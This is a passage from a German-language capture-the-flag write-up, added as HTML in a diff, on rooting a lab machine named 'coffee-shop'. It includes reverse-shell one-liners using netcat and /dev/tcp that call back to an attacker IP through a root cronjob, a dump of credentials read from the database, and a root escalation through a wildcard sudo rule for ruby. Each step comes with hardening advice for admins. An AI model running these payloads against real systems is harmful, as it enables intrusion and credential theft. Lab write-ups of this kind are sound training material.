+                     <div class="prompt">tuna@coffee-shop:/tmp$ <span class="command">echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 5552 >/tmp/f' > exe2.sh</span></div>
+                     <div class="prompt">tuna@coffee-shop:/tmp$ <span class="command">chmod +x exe2.sh</span></div>
+                     <!-- Kein Output -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein zweites Payload-Skript `/tmp/exe2.sh` wird erstellt, das die FIFO-basierte interaktive Reverse Shell verwendet, die zuvor schon (erfolglos) direkt eingegeben wurde. Es wird ebenfalls ausführbar gemacht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein alternativer Payload, der oft eine stabilere interaktive Shell liefert als `nc -e`. Wenn der Cronjob `/bin/bash /tmp/exe2.sh` ausführt, sollte eine Verbindung zum Listener auf Port 5552 aufgebaut werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der Listener auf Port 5552 läuft. Warten Sie auf die Ausführung durch den Cronjob.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie den Cronjob und das unsichere Skript.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener für Payload auf Port 5552 -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">nc -lvnp 5552</span></div>
+                     <pre>
+listening on [any] 5552 ...
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifersystem wird ein Netcat-Listener gestartet, der auf eingehende Verbindungen auf Port 5552 wartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Listener ist bereit, die Reverse Shell von einem der Payloads (`exe.sh` oder `exe2.sh`) zu empfangen, sobald der Cronjob sie ausführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warten Sie auf die eingehende Verbindung. Wenn nach einer Minute keine Verbindung zustande kommt, überprüfen Sie die Payloads in `/tmp` auf Fehler.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Verbindungen und blockieren Sie nicht autorisierte Verbindungen.</p>
+
+             <!-- Späterer Login in MySQL und Auslesen der Daten (gehört logisch hierher, auch wenn im Text später) -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/shop$ <span class="command">cat login.php</span></div>
+                     <pre>
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+session_start();
+
+$host = 'localhost';
+$username = 'shopadmin';
+$password = '<span class="password">1_4m_4dmin</span>';
+$database = 'midnightcoffee';
+[...]
+// Code maskiert mit < und >
+?>
+                     </pre>
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/shop$ <span class="command">mysql -u shopadmin -p<span class="password">1_4m_4dmin</span></span></div>
+                     <pre>
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor. [...]
+Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)
+[...]
+mysql> use midnightcoffee;
+Database changed
+mysql> show tables;
++--------------------------+
+| Tables_in_midnightcoffee |
++--------------------------+
+| users                    |
++--------------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----+-----------+--------------------------------------------------------------+----------------------------------+
+| id | username  | password                                                     | auth_token                       |
++----+-----------+--------------------------------------------------------------+----------------------------------+
+|  1 | shopadmin | <span class="password">$2a$12$yqH60JyTqoPHXe1g1cGDu93me1v.wGcEEZV5rLy39stUJ.Xsjwi</span> | NULL                             |
+|  2 | tuna      | <span class="password">1L0v3_TuN4_Very_Much</span>                                         | NULL                             |
+|  3 | developer | <span class="password">developer</span>                                                    | dd8d23729974353e112626aee58bbad9 |
++----+-----------+--------------------------------------------------------------+----------------------------------+
+3 rows in set (0.00 sec)
+
+mysql> exit
+Bye
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Quellcode von `/var/www/html/shop/login.php` wird angezeigt. Er enthält die Zugangsdaten für die MySQL-Datenbank (`shopadmin`:`<span class="password">1_4m_4dmin</span>`, Datenbank `midnightcoffee`). Anschließend wird sich mit diesen Zugangsdaten erfolgreich am lokalen MySQL-Server angemeldet. Die Tabelle `users` in der Datenbank `midnightcoffee` wird abgefragt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datenbankabfrage bestätigt die bereits bekannten Passwörter für `tuna` und `developer`. Sie enthüllt außerdem den Passwort-Hash für den Datenbankbenutzer `shopadmin`: `$2a$12$...`. Dies ist ein bcrypt-Hash (erkennbar am `$2a$12$`), ein sicherer Hashing-Algorithmus. Es bestätigt auch, dass das Passwort `<span class="password">1_4m_4dmin</span>` aus `login.php` das korrekte Datenbankpasswort für `shopadmin` ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datenbank enthält keine neuen, direkt verwertbaren Klartextpasswörter. Der bcrypt-Hash ist schwer zu knacken. Fokussieren Sie sich auf den Cronjob-Exploit.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Speichern Sie Datenbank-Zugangsdaten niemals direkt im Quellcode von PHP-Dateien. Verwenden Sie Konfigurationsdateien außerhalb des Web-Roots oder Umgebungsvariablen. Das Passwort `1_4m_4dmin` sollte geändert werden. Auch wenn bcrypt sicher ist, ist das Passwort selbst möglicherweise nicht stark genug.</p>
+
+            <!-- Dritter Payload-Versuch für Cronjob -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tuna@coffee-shop:/tmp$ <span class="command">echo 'bash -i >& /dev/tcp/192.168.2.199/9001 0>&1' > rev.sh</span></div>
+                     <!-- Kein Output -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein drittes Payload-Skript `/tmp/rev.sh` wird erstellt. Dieses verwendet eine gängige Bash-Methode, um eine interaktive Reverse Shell (`bash -i`) über eine TCP-Verbindung (`/dev/tcp/IP/PORT`) zum Angreifer auf Port 9001 umzuleiten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein weiterer valider Payload zur Ausnutzung des Cronjobs. Er ist oft zuverlässiger als `nc -e`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Listener auf Port 9001 (`nc -lvnp 9001`) auf dem Angreifersystem und warten Sie auf die Ausführung durch den Cronjob. Machen Sie das Skript ausführbar (`chmod +x /tmp/rev.sh`).
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie den Cronjob und das unsichere Skript.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener für Payload auf Port 9001 -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/hakrawler]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                     <!-- Eingehende Verbindung -->
+                     <pre>
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.107] 36788
+bash: cannot set terminal process group (3533): Inappropriate ioctl for device
+bash: no job control in this shell
+shopadmin@coffee-shop:~$
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Listener wird auf Port 9001 gestartet. Kurz darauf kommt eine Verbindung vom Zielsystem (`192.168.2.107`) herein. Der Shell-Prompt `shopadmin@coffee-shop:~$` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Cronjob hat das Skript `/tmp/rev.sh` (oder ein anderes `.sh`-Skript in `/tmp`) ausgeführt. Allerdings läuft die erhaltene Shell als Benutzer `shopadmin`, **nicht** als `root`, wie erwartet. Dies ist seltsam, da der Cronjob in `/etc/crontab` explizit als `root` definiert war. Mögliche Erklärungen: Der Cronjob wurde geändert, das Skript `/home/shopadmin/execute.sh` verwendet `su shopadmin` oder `sudo -u shopadmin`, oder es gab einen Fehler bei der Interpretation der Ausgabe. **Update:** Der Rohtext zeigt, dass die Root-Flagge später mit einem Ruby-Exploit geholt wird, der von `shopadmin` ausgeführt wird. Es scheint, als ob der Cronjob-Exploit hier wider Erwarten nur eine `shopadmin`-Shell lieferte, oder dass der Pentester die Shell als `shopadmin` erhielt und dann den `sudo ruby` exploit verwendete.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Benutzerrechte in der neuen Shell mit `id` und `sudo -l`. Da wir nun als `shopadmin` sind, können wir den `sudo ruby`-Vektor ausnutzen, der zuvor nicht zugänglich war.
+             <br><strong>Empfehlung (Admin):</strong> Untersuchen Sie den Cronjob und das Skript `/home/shopadmin/execute.sh` genau, um zu verstehen, warum die Shell als `shopadmin` und nicht als `root` ausgeführt wurde (falls dies tatsächlich so war). Unabhängig davon muss der Cronjob-Mechanismus korrigiert werden.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- In der shopadmin-Shell -->
+                      <div class="prompt">shopadmin@coffee-shop:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for shopadmin on coffee-shop:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User shopadmin may run the following commands on coffee-shop:
+    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Berechtigungen für den Benutzer `shopadmin` werden überprüft.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt den zweiten potenziellen Privilege-Escalation-Pfad: `shopadmin` kann `/usr/bin/ruby` mit einem beliebigen Skript (`*`) gefolgt von `/opt/shop.rb` als `root` ohne Passwort (`NOPASSWD`) ausführen. Die Wildcard (`*`) ist der entscheidende Punkt, der die Ausnutzung ermöglicht.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese `sudo`-Regel, um Root-Rechte zu erlangen. Erstellen Sie ein einfaches Ruby-Skript, das eine Shell startet (z.B. `exec "/bin/bash"`), und führen Sie es mit `sudo -u root /usr/bin/ruby /pfad/zum/skript.rb /opt/shop.rb` aus.
+              <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Diese `sudo`-Regel ist extrem gefährlich wegen der Wildcard (`*`). Entfernen Sie die Wildcard und erlauben Sie nur die Ausführung des spezifischen Skripts `/opt/shop.rb`, wenn dies absolut notwendig ist. Besser noch: Entfernen Sie die Regel ganz, wenn `shopadmin` keine Root-Rechte benötigt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Untersuchung des erlaubten Ruby-Skripts -->
+                     <div class="prompt">shopadmin@coffee-shop:~$ <span class="command">cat /opt/shop.rb</span></div>
+                     <pre>
+puts "C0FF33 SHPS R L33T"
+                     </pre>
+                     <div class="prompt">shopadmin@coffee-shop:~$ <span class="command">ls -la /opt/shop.rb</span></div>
+                     <pre>
+-rw-r--r-- 1 root root 27 Jan  3 14:00 /opt/shop.rb
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Skript `/opt/shop.rb`, das in der `sudo`-Regel erwähnt wird, wird untersucht. Es gibt nur einen einfachen Text aus. Seine Berechtigungen sind `-rw-r--r--` und es gehört `root`. Es ist also nicht direkt modifizierbar.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript selbst ist harmlos und nicht direkt ausnutzbar. Die Schwachstelle liegt ausschließlich in der `sudo`-Regel, die erlaubt, `/usr/bin/ruby` mit einem *beliebigen* ersten Skriptargument auszuführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie den Inhalt von `/opt/shop.rb`. Erstellen Sie Ihr eigenes Ruby-Skript an einem beschreibbaren Ort (z.B. `/tmp`) und nutzen Sie die `sudo`-Regel, um dieses Skript als `root` auszuführen.
+             <br><strong>Empfehlung (Admin):</strong> Die Berechtigungen von `/opt/shop.rb` sind korrekt, aber die `sudo`-Regel ist das Problem.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Exploit der Ruby Sudo-Regel -->
+                     <div class="prompt">shopadmin@coffee-shop:~$ <span class="command">echo 'exec "/bin/bash"' > /tmp/bash.rb</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">shopadmin@coffee-shop:~$ <span class="command">cd /tmp</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">shopadmin@coffee-shop:/tmp$ <span class="command">sudo -u root /usr/bin/ruby bash.rb /opt/shop.rb</span></div>
+                     <pre>
+root@coffee-shop:/tmp#
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein einfaches Ruby-Skript `/tmp/bash.rb` wird erstellt, das lediglich `/bin/bash` ausführt. Anschließend wird die `sudo`-Regel ausgenutzt: `sudo -u root /usr/bin/ruby bash.rb /opt/shop.rb`. Da die `sudo`-Regel `/usr/bin/ruby * /opt/shop.rb` erlaubt, wird `/tmp/bash.rb` als das erste Skriptargument (`*`) akzeptiert und von Ruby als `root` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Die Ausführung des Befehls öffnet eine neue Shell, und der Prompt `root@coffee-shop:/tmp#` zeigt, dass diese Shell mit `root`-Rechten läuft. Die Privilege Escalation war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Root-Zugriff erlangt. Suchen Sie nach der Root-Flagge (vermutlich in `/root`).
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- In der Root-Shell -->
+                     <div class="prompt">root@coffee-shop:/tmp# <span class="command">cd ~</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">root@coffee-shop:~# <span class="command">ls</span></div>
+                     <pre>
+root.txt  snap
+                     </pre>
+                     <div class="prompt">root@coffee-shop:~# <span class="command">cat root.txt</span></div>
+                     <pre>
+<span class="password">C4FF3331N-ADD1CCCTINNNN</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird ins Home-Verzeichnis (`/root`) gewechselt, der Inhalt aufgelistet und die Datei `root.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flagge `<span class="password">C4FF3331N-ADD1CCCTINNNN</span>` wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Ziele erreicht. Dokumentieren Sie den Prozess.
+             <br><strong>Empfehlung (Admin):</strong> Nach Behebung der Schwachstellen (unsichere Webseiteninhalte, Klartextpasswörter, Cronjob, sudo-Regel) das System härten und auf kompromittierte Konten oder Backdoors überprüfen.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der User-Flagge (in der shopadmin Shell) -->
+                     <div class="flag-command">cat user.txt</div> <!-- Annahme: /home/shopadmin/user.txt -->
+                     <!-- User-Flagge -->
+                     <div class="flag-value"><span class="password">DR1NK1NG-C0FF33-4T-N1GHT</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der Root-Flagge -->
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <!-- Root-Flagge -->
+                     <div class="flag-value"><span class="password">C4FF3331N-ADD1CCCTINNNN</span></div>
+                 </div>
+             </div>
+             <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt -->
+         </section>
+    
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Nikto Scans übernommen -->
+        <p>Berichtsdatum: 2024-04-19</p>
+    </footer>
+</body>
+</html>
